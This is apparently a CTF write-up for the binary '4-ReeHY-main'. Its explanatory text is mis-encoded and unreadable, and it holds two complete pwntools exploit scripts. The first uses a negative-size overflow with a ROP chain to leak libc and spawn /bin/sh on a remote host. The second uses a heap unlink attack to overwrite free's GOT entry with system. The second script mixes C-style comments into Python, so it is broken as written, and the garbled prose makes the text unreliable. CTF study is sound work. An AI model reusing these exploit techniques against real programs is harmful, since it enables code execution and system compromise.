# 4-ReeHY-main  
�����Ŀ������������һ�������������һ����unlink��������Ҫ����unlink��  
***
## һ���������  
������Ҫ��Ϊ������Ҫ���ݣ��ֱ��Ǵ����ı���ɾ���ı����༭�ı������ȷ���create����  
![](./index_files/1.png)
���Կ���������һ�����Ե����������������һ�����ǿ��Թ���ROP��й¶libc��ַ��ִ��system������������exp  
```python
from pwn import *

#p = process('./4-ReeHY-main-100')
p = remote("111.198.29.45", 31226)

elf = ELF('./4-ReeHY-main-100')
libc = elf.libc
pop_addr = 0x0000000000400DA3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x0000000000400C8C
start_addr = 0x0000000000400760
gadget_sym = 0x45216

print p.recvuntil('$ ')
p.sendline('1234')
print p.recvuntil('$ ')
p.sendline('1')
print p.recvuntil('Input size\n')
p.sendline('-1')
print p.recvuntil('Input cun\n')
p.sendline('1')
payload = 'a' * 0x88 + '\x00' * 8 + 'a' * 8 + p64(pop_addr) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
print p.recvuntil('Input content\n')
p.sendline(payload)
data = p.recv(numb = 6)
data = data.ljust(8,'\x00')
data = u64(data)
puts_addr = data
print 'puts_addr:' + hex(data)

libc_addr = puts_addr - libc.symbols['puts']
print 'libc_addr:' + hex(libc_addr)
sys_addr = libc_addr + libc.symbols['system']
print 'sys_addr:' + hex(sys_addr)
bin_addr = libc_addr + libc.search('/bin/sh').next()
print 'bin_Addr:' + hex(bin_addr)
gadget_addr = libc_addr + gadget_sym
print 'gadget_addr:' + hex(gadget_addr)

print p.recvuntil('$ ')
p.sendline('1234')
print p.recvuntil('$ ')
p.sendline('1')
print p.recvuntil('Input size\n')
p.sendline('-1')
print p.recvuntil('Input cun\n')
p.sendline('1')
payload = 'a' * 0x88 + '\x00' * 8 + 'a' * 8 + p64(pop_addr) + p64(bin_addr) + p64(sys_addr) + p64(start_addr)
#payload = 'a' * 0x88 + '\x00' * 8 + 'a' * 8 + p64(gadget_addr)
print p.recvuntil('Input content\n')
p.sendline(payload)
p.interactive()
```
***
## ����unlink  
����������Կ�����deleteɾ���ı���ʱ����free���ѿ�֮��û���������ַ�������ָ��   
![](./index_files/2.png)
�������ǵ������������̾ͻ���ȷ�������ˣ�������create����smallbin��С�Ķѿ鲢�ͷţ�ʹsmallbin���п��жѿ顣Ȼ����������ϴ�Ķѿ飬α��ѿ鲢����unlink�������������ǿ����Ƚ�һ��ָ���Ϊ�����޸ĵ�����ָ�룬�������ǾͿ��Ժܷ���Ķ�ζ�����λ��д�ˡ�������ǽ�free�����ȸ�Ϊputs����й¶libc��ַ��Ȼ���ٽ����Ϊsystem����getshell����Ȼ�����滹�кܶ���Ҫע���ϸ�ڣ���Щ����exp���ᵽ   
```python
from pwn import *

context.log_level = True

p = process('./4-ReeHY-main-100')
#p = remote('111.198.29.45', 55988)
elf = ELF('4-ReeHY-main-100')
libc = elf.libc
#gdb.attach(p, 'b* 0x400aa5')

puts_plt = elf.plt['puts']
free_got = elf.got['free']
puts_got = elf.got['puts']


def create(size, cun, content):
    print p.recvuntil('$')
    p.sendline('1')
    print p.recvuntil('Input size\n')
    p.sendline(str(size))
    print p.recvuntil('Input cun\n')
    p.sendline(str(cun))
    print p.recvuntil('Input content\n')
    p.sendline(content)

def dele(cun):
    print p.recvuntil('$')
    p.sendline('2')
    print p.recvuntil('Chose one to dele\n')
    p.sendline(str(cun))

def edit(cun, content):
    print p.recvuntil('$')
    p.sendline('3')
    print p.recvuntil('Chose one to edit\n')
    p.sendline(str(cun))
    print p.recvuntil('Input the content\n')
    p.sendline(content)

def edit2(cun, content):
    print p.recvuntil('$')
    p.sendline('3')
    print p.recvuntil('Chose one to edit\n')
    p.sendline(str(cun))
    print p.recvuntil('Input the content\n')
    p.send(content)


print p.recvuntil('$')
p.sendline('b0m13')

/*�ȴ����á�/bin/sh���ַ����Դ�����ʹ��*/
create(0x20, 4, '/bin/sh')
create(0x100, 0, 'chunk0')    #sizeҪ����0x80������Ὣ���жѿ���뵽fastbin��
create(0x100, 1, 'chunk1')

/*���smallbin�еĿ��жѿ�*/
dele(0)
dele(1)

/*����αװ�ѿ飬��һ��ָ���Ϊ�����޸ĵ�����ָ�룬ע������ֻ��������ԣ���Ϊ���б�־λҪ���ǽ���*/
payload1 = p64(0) + p64(0x100) + p64(0x6020e8) + p64(0x602100 - 0x10) + 'a' * (0x100 - 32) + p64(0x100) + p64(0x110)
create(0x210, 2, payload1)

/*unlink����*/
dele(1)

/*����freeΪputs*/
payload2 = p64(0) + p64(puts_got) + p64(1) + p64(free_got) + p64(1)
edit(2, payload2)

/*ע������'\n'�Ḳ�Ǻ����got�������Ҫ��'\n'ȥ��*/
edit2(2, p64(puts_plt))

dele(1)

puts_addr = u64(p.recv(6) + '\x00' * 2)
print 'puts_addr:' + hex(puts_addr)

libc_addr = puts_addr - libc.symbols['puts']
print 'libc_addr:' + hex(libc_addr)

sys_addr = libc_addr + libc.symbols['system']
print 'sys_addr:' + hex(sys_addr)

/*����freeΪsystem*/
edit2(2, p64(sys_addr))

/*getshell*/
dele(4)
p.interactive()
```
